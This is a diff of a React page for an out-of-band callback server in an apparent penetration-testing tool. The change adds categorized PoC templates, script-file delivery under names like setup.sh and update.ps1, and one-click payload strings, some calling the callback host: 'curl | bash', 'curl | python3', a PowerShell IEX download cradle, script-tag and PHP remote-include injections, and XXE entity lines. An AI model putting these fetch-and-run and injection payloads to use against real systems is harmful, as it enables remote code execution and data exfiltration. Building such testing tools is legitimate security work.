@@ -1,9 +1,10 @@
 import { useState, useEffect, useRef } from 'react'
+import { useNavigate } from 'react-router-dom'
 import { 
   Radio, Copy, Check, Trash2, Plus, RefreshCw,
   Clock, Globe, ChevronDown, ChevronUp,
   AlertCircle, Loader2, Pause, Play, Info,
-  BarChart3, Users, FileCode, Link2, Zap, Edit2, X
+  BarChart3, Users, FileCode, Link2, Zap, Edit2, X, ExternalLink
 } from 'lucide-react'
 import { callbackApi } from '@/lib/api'
 import toast from 'react-hot-toast'
@@ -64,22 +65,36 @@ interface PocRule {
   is_active: boolean
   hit_count: number
   url: string
+  filename: string | null
   created_at: string
 }
 
 interface PocTemplate {
   name: string
   description: string
+  category?: string
   content_type?: string
   response_body?: string
   redirect_url?: string
   status_code?: number
   enable_variables?: boolean
+  filename?: string
+  usage?: string
+}
+
+const CATEGORY_LABELS: Record<string, string> = {
+  xss: 'XSS 跨站脚本',
+  xxe: 'XXE 注入',
+  ssrf: 'SSRF 探测',
+  rce: '远程命令执行',
+  shell: '反弹 Shell',
+  script: '脚本文件',
 }
 
 type TabType = 'records' | 'stats' | 'poc'
 
 export default function CallbackServer() {
+  const navigate = useNavigate()
   const [tokens, setTokens] = useState<Token[]>([])
   const [selectedToken, setSelectedToken] = useState<Token | null>(null)
   const [records, setRecords] = useState<CallbackRecord[]>([])
@@ -89,6 +104,7 @@ export default function CallbackServer() {
   const [polling, setPolling] = useState(false)
   const [copiedId, setCopiedId] = useState<string | null>(null)
   const [expandedRecord, setExpandedRecord] = useState<string | null>(null)
+  const [expandedExfil, setExpandedExfil] = useState<string | null>(null)
   const [newTokenName, setNewTokenName] = useState('')
   const [expiresHours, setExpiresHours] = useState(24)
   const [showCreateForm, setShowCreateForm] = useState(false)
@@ -109,6 +125,7 @@ export default function CallbackServer() {
     redirect_url: '',
     delay_ms: 0,
     enable_variables: false,
+    filename: '',
   })
   
   const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null)
@@ -125,6 +142,37 @@ export default function CallbackServer() {
       return `${protocol}//${host}`
     }
     return ''
+  }
+
+  // 构建完整 URL（兼容后端返回绝对/相对路径两种情况）
+  const getFullUrl = (path: string, suffix?: string) => {
+    const base = path.startsWith('http') ? path : `${getBaseUrl()}${path}`
+    return suffix ? `${base}${suffix}` : base
+  }
+
+  // 复制到剪贴板（兼容非 HTTPS 环境）
+  const copyToClipboard = async (text: string): Promise<boolean> => {
+    if (navigator.clipboard && window.isSecureContext) {
+      try {
+        await navigator.clipboard.writeText(text)
+        return true
+      } catch { /* fall through */ }
+    }
+    // fallback: textarea + execCommand
+    const textarea = document.createElement('textarea')
+    textarea.value = text
+    textarea.style.position = 'fixed'
+    textarea.style.opacity = '0'
+    document.body.appendChild(textarea)
+    textarea.select()
+    try {
+      document.execCommand('copy')
+      return true
+    } catch {
+      return false
+    } finally {
+      document.body.removeChild(textarea)
+    }
   }
 
   // 检测 Token 是否已过期
@@ -339,13 +387,13 @@ export default function CallbackServer() {
 
   // 复制 URL
   const copyUrl = async (token: Token, rulePath?: string) => {
-    const fullUrl = `${getBaseUrl()}${token.url}${rulePath ? `/p/${rulePath}` : ''}`
-    try {
-      await navigator.clipboard.writeText(fullUrl)
+    const fullUrl = getFullUrl(token.url, rulePath ? `/p/${rulePath}` : '')
+    const ok = await copyToClipboard(fullUrl)
+    if (ok) {
       setCopiedId(rulePath || token.id)
       toast.success('已复制')
       setTimeout(() => setCopiedId(null), 2000)
-    } catch {
+    } else {
       toast.error('复制失败')
     }
   }
@@ -361,6 +409,7 @@ export default function CallbackServer() {
       redirect_url: '',
       delay_ms: 0,
       enable_variables: false,
+      filename: '',
     })
     setEditingRule(null)
   }
@@ -377,8 +426,43 @@ export default function CallbackServer() {
         redirect_url: template.redirect_url || '',
         delay_ms: 0,
         enable_variables: template.enable_variables || false,
+        filename: template.filename || '',
       })
       toast.success('已应用模板')
+    }
+  }
+
+  const getTemplatesByCategory = () => {
+    const grouped: Record<string, [string, PocTemplate][]> = {}
+    Object.entries(pocTemplates).forEach(([key, tpl]) => {
+      const cat = tpl.category || 'other'
+      if (!grouped[cat]) grouped[cat] = []
+      grouped[cat].push([key, tpl])
+    })
+    return grouped
+  }
+
+  const getUsageHint = (rule: PocRule): string => {
+    const fullUrl = getFullUrl(selectedToken?.url || '', `/p/${rule.name}`)
+    if (rule.filename?.endsWith('.sh')) return `curl -sL '${fullUrl}' | bash`
+    if (rule.filename?.endsWith('.py')) return `curl -sL '${fullUrl}' | python3`
+    if (rule.filename?.endsWith('.ps1')) return `powershell -ep bypass -c "IEX(IWR '${fullUrl}')"`
+    if (rule.filename?.endsWith('.js')) return `<script src="${fullUrl}"></script>`
+    if (rule.filename?.endsWith('.php')) return `<?php include('${fullUrl}'); ?>`
+    if (rule.redirect_url) return fullUrl
+    if (rule.content_type === 'text/html') return `<script src="${fullUrl}"></script>`
+    if (rule.content_type === 'application/xml-dtd') return `<!ENTITY % dtd SYSTEM "${fullUrl}"> %dtd;`
+    if (rule.content_type === 'application/xml') return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${fullUrl}">]>`
+    if (rule.content_type === 'text/javascript') return `<script src="${fullUrl}"></script>`
+    return `curl -sL '${fullUrl}'`
+  }
+
+  const copyPayloadUsage = async (rule: PocRule) => {
+    const ok = await copyToClipboard(getUsageHint(rule))
+    if (ok) {
+      toast.success('已复制 Payload')
+    } else {
+      toast.error('复制失败')
     }
   }
 
@@ -429,8 +513,15 @@ export default function CallbackServer() {
       redirect_url: rule.redirect_url || '',
       delay_ms: rule.delay_ms,
       enable_variables: rule.enable_variables,
+      filename: rule.filename || '',
     })
     setShowPocForm(true)
+  }
+
+  // 格式化 IP（::ffff:x.x.x.x → x.x.x.x）
+  const formatIp = (ip: string | null) => {
+    if (!ip) return 'Unknown'
+    return ip.startsWith('::ffff:') ? ip.slice(7) : ip
   }
 
   // 格式化时间
@@ -446,7 +537,7 @@ export default function CallbackServer() {
   }
 
   return (
-    <div className="h-[calc(100vh-8rem)] flex animate-fadeIn">
+    <div className="h-[calc(100vh-8rem)] min-w-0 flex animate-fadeIn">
       {/* 左侧：Token 列表 */}
       <div className="w-80 bg-theme-card border-r border-theme-border p-4 flex flex-col">
         <div className="flex items-center justify-between mb-4">
@@ -555,7 +646,7 @@ export default function CallbackServer() {
       </div>
 
       {/* 右侧：记录详情 */}
-      <div className="flex-1 flex flex-col">
+      <div className="flex-1 min-w-0 flex flex-col overflow-hidden">
         {selectedToken ? (
           <>
             {/* 工具栏 */}
@@ -567,7 +658,7 @@ export default function CallbackServer() {
                   </h3>
                   <div className="flex items-center gap-2 mt-1">
                     <code className="text-xs bg-theme-bg px-2 py-1 rounded font-mono text-theme-primary">
-                      {getBaseUrl()}{selectedToken.url}
+                      {getFullUrl(selectedToken.url)}
                     </code>
                     <button
                       onClick={() => copyUrl(selectedToken)}
@@ -635,7 +726,7 @@ export default function CallbackServer() {
                 <div className="text-theme-muted">
                   <span className="text-blue-400 font-medium">使用方法：</span>
                   将 URL 注入到目标进行 OOB 测试（SSRF、XXE、RCE、盲注等）。<strong>所有请求都会被记录</strong>，用于验证漏洞触发。
-                  支持路径：<code className="bg-theme-bg px-1 rounded">{selectedToken.url}/payload-id</code>
+                  支持路径：<code className="bg-theme-bg px-1 rounded">{getFullUrl(selectedToken.url)}/payload-id</code>
                 </div>
               </div>
 
@@ -686,10 +777,10 @@ export default function CallbackServer() {
             </div>
 
             {/* 内容区域 */}
-            <div className="flex-1 overflow-y-auto p-4">
+            <div className="flex-1 min-w-0 overflow-y-auto overflow-x-hidden p-4">
               {activeTab === 'records' ? (
                 // 请求记录列表
-                <div className="space-y-3">
+                <div className="space-y-3 min-w-0">
                   {loading ? (
                     <div className="flex items-center justify-center py-12">
                       <Loader2 className="w-6 h-6 animate-spin text-theme-primary" />
@@ -707,7 +798,7 @@ export default function CallbackServer() {
                       <div
                         key={record.id}
                         className={cn(
-                          "rounded-lg overflow-hidden",
+                          "rounded-lg overflow-hidden min-w-0 max-w-full",
                           record.is_data_exfil 
                             ? "bg-red-500/10 border-2 border-red-500/50 shadow-lg shadow-red-500/20" 
                             : record.is_poc_hit 
@@ -722,22 +813,22 @@ export default function CallbackServer() {
                           )}
                           className="p-3 cursor-pointer hover:bg-theme-bg/50 transition-colors"
                         >
-                          <div className="flex items-center justify-between">
-                            <div className="flex items-center gap-3">
+                          <div className="flex items-center justify-between gap-3 min-w-0">
+                            <div className="flex items-center gap-3 min-w-0 flex-1 overflow-hidden">
                               {/* POC 成功标记 */}
                               {record.is_data_exfil && (
-                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-red-500 text-white animate-pulse flex items-center gap-1">
+                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-red-500 text-white animate-pulse flex-shrink-0 flex items-center gap-1">
                                   <Zap className="w-3 h-3" />
                                   POC成功
                                 </span>
                               )}
                               {record.is_poc_hit && !record.is_data_exfil && (
-                                <span className="px-2 py-0.5 rounded text-xs font-medium bg-amber-500/20 text-amber-400">
+                                <span className="px-2 py-0.5 rounded text-xs font-medium bg-amber-500/20 text-amber-400 flex-shrink-0">
                                   PoC命中
                                 </span>
                               )}
                               <span className={cn(
-                                'px-2 py-0.5 rounded text-xs font-mono',
+                                'px-2 py-0.5 rounded text-xs font-mono flex-shrink-0',
                                 record.method === 'GET' && 'bg-green-500/20 text-green-400',
                                 record.method === 'POST' && 'bg-blue-500/20 text-blue-400',
                                 record.method === 'PUT' && 'bg-yellow-500/20 text-yellow-400',
@@ -746,22 +837,34 @@ export default function CallbackServer() {
                               )}>
                                 {record.method}
                               </span>
-                              <span className="font-mono text-sm text-theme-text">
+                              <span className="font-mono text-sm text-theme-text truncate min-w-0">
                                 {record.path}
                                 {record.query_string && (
-                                  <span className="text-theme-muted">?{record.query_string}</span>
+                                  <span className="text-theme-muted">
+                                    ?{record.query_string.length > 40 ? record.query_string.slice(0, 40) + '…' : record.query_string}
+                                  </span>
                                 )}
                               </span>
                             </div>
-                            <div className="flex items-center gap-3 text-xs text-theme-muted">
+                            <div className="flex items-center gap-3 text-xs text-theme-muted flex-shrink-0">
                               {record.exfil_type && (
                                 <span className="text-red-400 font-medium">
                                   [{record.exfil_type}]
                                 </span>
                               )}
-                              <span className="flex items-center gap-1">
+                              <span
+                                className="flex items-center gap-1 cursor-pointer hover:text-theme-primary transition-colors"
+                                onClick={(e) => {
+                                  e.stopPropagation()
+                                  const ip = formatIp(record.client_ip)
+                                  if (ip !== 'Unknown') {
+                                    navigate(`/tools/network?q=${encodeURIComponent(ip)}`)
+                                  }
+                                }}
+                                title={formatIp(record.client_ip) !== 'Unknown' ? '点击跳转网络工具查询' : undefined}
+                              >
                                 <Globe className="w-3 h-3" />
-                                {record.client_ip || 'Unknown'}
+                                {formatIp(record.client_ip)}
                               </span>
                               <span className="flex items-center gap-1">
                                 <Clock className="w-3 h-3" />
@@ -775,7 +878,7 @@ export default function CallbackServer() {
                             </div>
                           </div>
                           {record.user_agent && (
-                            <div className="mt-2 text-xs text-theme-muted truncate">
+                            <div className="mt-2 text-xs text-theme-muted truncate max-w-full">
                               UA: {record.user_agent}
                             </div>
                           )}
@@ -783,39 +886,88 @@ export default function CallbackServer() {
 
                         {/* 展开详情 */}
                         {expandedRecord === record.id && (
-                          <div className="border-t border-theme-border p-4 space-y-4 bg-theme-bg/30">
+                          <div className="border-t border-theme-border p-4 space-y-4 bg-theme-bg/30 min-w-0 overflow-hidden">
                             {/* 外带数据（POC成功时显示） */}
-                            {record.is_data_exfil && record.exfil_data && (
-                              <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
-                                <h4 className="text-sm font-bold text-red-400 mb-2 flex items-center gap-2">
-                                  <Zap className="w-4 h-4" />
-                                  🎯 外带数据 - 攻击验证成功
-                                  {record.exfil_type && (
-                                    <span className="text-xs bg-red-500/20 px-2 py-0.5 rounded">
-                                      类型: {record.exfil_type}
-                                    </span>
-                                  )}
-                                </h4>
-                                <pre className="bg-black/30 rounded p-3 font-mono text-sm text-red-300 max-h-60 overflow-auto whitespace-pre-wrap break-all">
-                                  {(() => {
-                                    try {
-                                      return decodeURIComponent(record.exfil_data)
-                                    } catch {
-                                      return record.exfil_data
-                                    }
-                                  })()}
-                                </pre>
-                                <div className="mt-2 text-xs text-red-400/70">
-                                  💡 提示: 外带数据证明目标系统执行了注入的payload并成功回传数据
+                            {record.is_data_exfil && record.exfil_data && (() => {
+                              const isExpanded = expandedExfil === record.id
+                              let decoded: string
+                              try { decoded = decodeURIComponent(record.exfil_data) } catch { decoded = record.exfil_data }
+                              const lines = decoded.split('\n')
+                              const isLong = lines.length > 8 || decoded.length > 500
+                              return (
+                                <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg min-w-0 overflow-hidden">
+                                  <div className="flex items-center justify-between mb-2">
+                                    <h4 className="text-sm font-bold text-red-400 flex items-center gap-2">
+                                      <Zap className="w-4 h-4" />
+                                      外带数据 - 攻击验证成功
+                                      {record.exfil_type && (
+                                        <span className="text-xs bg-red-500/20 px-2 py-0.5 rounded font-normal">
+                                          {record.exfil_type}
+                                        </span>
+                                      )}
+                                      <span className="text-xs font-normal text-red-400/60">
+                                        {decoded.length} 字符 / {lines.length} 行
+                                      </span>
+                                    </h4>
+                                    <div className="flex items-center gap-2">
+                                      <button
+                                        onClick={(e) => {
+                                          e.stopPropagation()
+                                          copyToClipboard(decoded).then(ok =>
+                                            toast[ok ? 'success' : 'error'](ok ? '已复制外带数据' : '复制失败')
+                                          )
+                                        }}
+                                        className="px-2 py-0.5 text-xs rounded bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-colors flex items-center gap-1"
+                                      >
+                                        <Copy className="w-3 h-3" />
+                                        复制
+                                      </button>
+                                      {isLong && (
+                                        <button
+                                          onClick={(e) => {
+                                            e.stopPropagation()
+                                            setExpandedExfil(isExpanded ? null : record.id)
+                                          }}
+                                          className="px-2 py-0.5 text-xs rounded bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-colors flex items-center gap-1"
+                                        >
+                                          {isExpanded ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
+                                          {isExpanded ? '收起' : '展开全部'}
+                                        </button>
+                                      )}
+                                    </div>
+                                  </div>
+                                  <pre className={cn(
+                                    "bg-black/30 rounded p-3 font-mono text-xs text-red-300 overflow-auto whitespace-pre-wrap break-all max-w-full transition-all",
+                                    isExpanded ? "max-h-[70vh]" : "max-h-32"
+                                  )}>
+                                    {decoded}
+                                  </pre>
                                 </div>
-                              </div>
-                            )}
+                              )
+                            })()}
 
                             {/* 基本信息 */}
                             <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-                              <div className="bg-theme-bg rounded-lg p-3">
+                              <div
+                                className={cn(
+                                  "bg-theme-bg rounded-lg p-3",
+                                  formatIp(record.client_ip) !== 'Unknown' && "cursor-pointer hover:bg-theme-bg/80 hover:ring-1 hover:ring-theme-primary/50 transition-all"
+                                )}
+                                onClick={(e) => {
+                                  if (formatIp(record.client_ip) !== 'Unknown') {
+                                    e.stopPropagation()
+                                    navigate(`/tools/network?q=${encodeURIComponent(formatIp(record.client_ip))}`)
+                                  }
+                                }}
+                                title={formatIp(record.client_ip) !== 'Unknown' ? '点击跳转网络工具查询' : undefined}
+                              >
                                 <div className="text-xs text-theme-muted mb-1">客户端 IP</div>
-                                <div className="font-mono text-sm text-theme-text">{record.client_ip || 'Unknown'}</div>
+                                <div className="font-mono text-sm text-theme-text flex items-center gap-1">
+                                  {formatIp(record.client_ip)}
+                                  {formatIp(record.client_ip) !== 'Unknown' && (
+                                    <ExternalLink className="w-3 h-3 opacity-50" />
+                                  )}
+                                </div>
                               </div>
                               <div className="bg-theme-bg rounded-lg p-3">
                                 <div className="text-xs text-theme-muted mb-1">协议</div>
@@ -839,7 +991,7 @@ export default function CallbackServer() {
                                 <Link2 className="w-3.5 h-3.5" />
                                 完整请求 URL
                               </h4>
-                              <div className="bg-theme-bg rounded-lg p-3 font-mono text-sm break-all">
+                              <div className="bg-theme-bg rounded-lg p-3 font-mono text-xs break-all max-h-24 overflow-auto max-w-full">
                                 <span className={cn(
                                   'font-bold mr-2',
                                   record.method === 'GET' && 'text-green-400',
@@ -876,7 +1028,7 @@ export default function CallbackServer() {
                                   <FileCode className="w-3.5 h-3.5" />
                                   请求头 Headers ({Object.keys(record.headers).length})
                                 </h4>
-                                <div className="bg-theme-bg rounded-lg p-3 font-mono text-xs max-h-48 overflow-y-auto">
+                                <div className="bg-theme-bg rounded-lg p-3 font-mono text-xs max-h-48 overflow-auto max-w-full">
                                   {Object.entries(record.headers).map(([key, value]) => (
                                     <div key={key} className="flex py-0.5 border-b border-theme-border/30 last:border-0">
                                       <span className="text-theme-primary min-w-[180px] font-medium">{key}:</span>
@@ -893,8 +1045,19 @@ export default function CallbackServer() {
                                 <h4 className="text-xs font-medium text-theme-muted mb-2 flex items-center gap-2">
                                   <FileCode className="w-3.5 h-3.5" />
                                   请求体 Body ({record.body.length} bytes)
+                                  <button
+                                    onClick={async (e) => {
+                                      e.stopPropagation()
+                                      const ok = await copyToClipboard(record.body || '')
+                                      toast[ok ? 'success' : 'error'](ok ? '已复制 Body' : '复制失败')
+                                    }}
+                                    className="ml-auto text-theme-primary hover:text-theme-primary/80 flex items-center gap-1"
+                                  >
+                                    <Copy className="w-3 h-3" />
+                                    <span>复制</span>
+                                  </button>
                                 </h4>
-                                <pre className="bg-theme-bg rounded-lg p-3 font-mono text-xs text-theme-text max-h-48 overflow-auto whitespace-pre-wrap break-all">
+                                <pre className="bg-theme-bg rounded-lg p-3 font-mono text-xs text-theme-text max-h-32 overflow-auto whitespace-pre-wrap break-all max-w-full">
                                   {record.body}
                                 </pre>
                               </div>
@@ -907,10 +1070,10 @@ export default function CallbackServer() {
                                   <FileCode className="w-3.5 h-3.5" />
                                   原始请求 Raw Request
                                   <button
-                                    onClick={(e) => {
+                                    onClick={async (e) => {
                                       e.stopPropagation()
-                                      navigator.clipboard.writeText(record.raw_request || '')
-                                      toast.success('已复制原始请求')
+                                      const ok = await copyToClipboard(record.raw_request || '')
+                                      toast[ok ? 'success' : 'error'](ok ? '已复制原始请求' : '复制失败')
                                     }}
                                     className="ml-auto text-theme-primary hover:text-theme-primary/80 flex items-center gap-1"
                                   >
@@ -918,7 +1081,7 @@ export default function CallbackServer() {
                                     <span>复制</span>
                                   </button>
                                 </h4>
-                                <pre className="bg-black/50 rounded-lg p-3 font-mono text-xs text-green-400 max-h-64 overflow-auto whitespace-pre border border-green-500/20">
+                                <pre className="bg-black/50 rounded-lg p-3 font-mono text-xs text-green-400 max-h-32 overflow-auto whitespace-pre break-all max-w-full border border-green-500/20">
                                   {record.raw_request}
                                 </pre>
                               </div>
@@ -1085,7 +1248,6 @@ export default function CallbackServer() {
                     <h3 className="font-medium text-theme-text">PoC 响应规则</h3>
                     <button
                       onClick={() => {
-                        // 默认应用第一个模板
                         const firstTemplateKey = Object.keys(pocTemplates)[0]
                         if (firstTemplateKey && pocTemplates[firstTemplateKey]) {
                           const tpl = pocTemplates[firstTemplateKey]
@@ -1098,6 +1260,7 @@ export default function CallbackServer() {
                             redirect_url: tpl.redirect_url || '',
                             delay_ms: 0,
                             enable_variables: tpl.enable_variables || false,
+                            filename: tpl.filename || '',
                           })
                         } else {
                           resetPocForm()
@@ -1130,7 +1293,7 @@ export default function CallbackServer() {
                         </button>
                       </div>
 
-                      {/* 模板选择 */}
+                      {/* 模板选择（按分类分组） */}
                       <div>
                         <label className="text-sm text-theme-muted mb-1 block">选择模板（自动填充）</label>
                         <select
@@ -1143,10 +1306,14 @@ export default function CallbackServer() {
                           defaultValue=""
                         >
                           <option value="" disabled>-- 切换模板 --</option>
-                          {Object.entries(pocTemplates).map(([key, tpl]) => (
-                            <option key={key} value={key}>
-                              {tpl.name} - {tpl.description}
-                            </option>
+                          {Object.entries(getTemplatesByCategory()).map(([cat, templates]) => (
+                            <optgroup key={cat} label={CATEGORY_LABELS[cat] || cat}>
+                              {templates.map(([key, tpl]) => (
+                                <option key={key} value={key}>
+                                  {tpl.name} - {tpl.description}
+                                </option>
+                              ))}
+                            </optgroup>
                           ))}
                         </select>
                       </div>
@@ -1162,7 +1329,7 @@ export default function CallbackServer() {
                             className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                           />
                           <p className="text-xs text-theme-muted mt-1">
-                            URL: {selectedToken?.url}/p/{pocForm.name || 'name'}
+                            URL: {getFullUrl(selectedToken?.url || '', `/p/${pocForm.name || 'name'}`)}
                           </p>
                         </div>
                         <div>
@@ -1175,6 +1342,26 @@ export default function CallbackServer() {
                             className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                           />
                         </div>
+                      </div>
+
+                      {/* 文件名（脚本文件投递用） */}
+                      <div>
+                        <label className="text-sm text-theme-muted mb-1 block">文件名（可选，设置后响应带 Content-Disposition）</label>
+                        <input
+                          type="text"
+                          value={pocForm.filename}
+                          onChange={(e) => setPocForm(p => ({ ...p, filename: e.target.value }))}
+                          placeholder="例: setup.sh / check.py / update.ps1"
+                          className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded font-mono"
+                        />
+                        <p className="text-xs text-blue-400/70 mt-1">
+                          {pocForm.filename?.endsWith('.sh') ? `Payload: curl -sL '…/p/${pocForm.name || 'name'}' | bash`
+                            : pocForm.filename?.endsWith('.py') ? `Payload: curl -sL '…/p/${pocForm.name || 'name'}' | python3`
+                            : pocForm.filename?.endsWith('.ps1') ? `Payload: powershell -ep bypass -c "IEX(IWR '…/p/${pocForm.name || 'name'}')"`
+                            : pocForm.filename?.endsWith('.js') ? `Payload: <script src="…/p/${pocForm.name || 'name'}"></script>`
+                            : pocForm.filename?.endsWith('.php') ? `Payload: <?php include('…/p/${pocForm.name || 'name'}'); ?>`
+                            : `Payload: curl -sL '…/p/${pocForm.name || 'name'}'`}
+                        </p>
                       </div>
 
                       <div className="grid grid-cols-3 gap-4">
@@ -1206,6 +1393,9 @@ export default function CallbackServer() {
                             <option value="application/xml">application/xml</option>
                             <option value="application/xml-dtd">application/xml-dtd</option>
                             <option value="text/javascript">text/javascript</option>
+                            <option value="application/x-httpd-php">application/x-httpd-php</option>
+                            <option value="application/x-sh">application/x-sh</option>
+                            <option value="application/octet-stream">application/octet-stream</option>
                           </select>
                         </div>
                         <div>
@@ -1300,9 +1490,11 @@ export default function CallbackServer() {
                                 'px-2 py-0.5 rounded text-xs font-mono',
                                 rule.redirect_url
                                   ? 'bg-yellow-500/20 text-yellow-400'
-                                  : 'bg-green-500/20 text-green-400'
+                                  : rule.filename
+                                    ? 'bg-purple-500/20 text-purple-400'
+                                    : 'bg-green-500/20 text-green-400'
                               )}>
-                                {rule.redirect_url ? rule.status_code : rule.content_type}
+                                {rule.redirect_url ? rule.status_code : rule.filename ? rule.filename : rule.content_type}
                               </span>
                               <span className="font-mono text-sm text-theme-text">{rule.name}</span>
                               {rule.description && (
@@ -1321,7 +1513,7 @@ export default function CallbackServer() {
                                 )}
                               >
                                 {copiedId === rule.name ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
-                                {copiedId === rule.name ? '已复制' : '复制'}
+                                {copiedId === rule.name ? '已复制' : 'URL'}
                               </button>
                               <button
                                 onClick={() => editPocRule(rule)}
@@ -1339,13 +1531,29 @@ export default function CallbackServer() {
                               </button>
                             </div>
                           </div>
+                          {/* Payload 一键复制 */}
                           <div 
-                            className="text-xs text-theme-muted font-mono bg-theme-bg rounded px-2 py-1 flex items-center justify-between group cursor-pointer hover:bg-theme-bg/80"
-                            onClick={() => copyUrl(selectedToken!, rule.name)}
-                            title="点击复制"
+                            className="text-xs font-mono bg-blue-500/10 border border-blue-500/25 rounded px-2.5 py-2 flex items-center justify-between group cursor-pointer hover:bg-blue-500/15 transition-colors"
+                            onClick={() => copyPayloadUsage(rule)}
+                            title="点击复制 Payload"
                           >
-                            <span className="truncate">{getBaseUrl()}{selectedToken?.url}/p/{rule.name}</span>
-                            <span className="ml-2 opacity-0 group-hover:opacity-100 transition-opacity text-theme-primary">
+                            <div className="flex items-center gap-2 min-w-0">
+                              <span className="text-blue-500 flex-shrink-0 font-semibold">$</span>
+                              <span className="text-blue-300 truncate">{getUsageHint(rule)}</span>
+                            </div>
+                            <button className="ml-2 px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 transition-colors flex-shrink-0 flex items-center gap-1">
+                              <Copy className="w-3 h-3" />
+                              复制
+                            </button>
+                          </div>
+                          {/* URL */}
+                          <div 
+                            className="text-xs text-theme-muted font-mono bg-theme-bg rounded px-2 py-1 flex items-center justify-between group cursor-pointer hover:bg-theme-bg/80 mt-1.5"
+                            onClick={() => copyUrl(selectedToken!, rule.name)}
+                            title="点击复制 URL"
+                          >
+                            <span className="truncate">{getFullUrl(selectedToken?.url || '', `/p/${rule.name}`)}</span>
+                            <span className="ml-2 opacity-0 group-hover:opacity-100 transition-opacity text-theme-primary flex-shrink-0">
                               {copiedId === rule.name ? '✓' : '复制'}
                             </span>
                           </div>
@@ -1355,7 +1563,7 @@ export default function CallbackServer() {
                             </div>
                           )}
                           {rule.response_body && !rule.redirect_url && (
-                            <pre className="mt-2 text-xs text-theme-muted bg-theme-bg rounded px-2 py-1 max-h-20 overflow-auto">
+                            <pre className="mt-2 text-xs text-theme-muted bg-theme-bg rounded px-2 py-1 max-h-20 overflow-auto whitespace-pre-wrap">
                               {rule.response_body.length > 200 
                                 ? rule.response_body.slice(0, 200) + '...' 
                                 : rule.response_body}
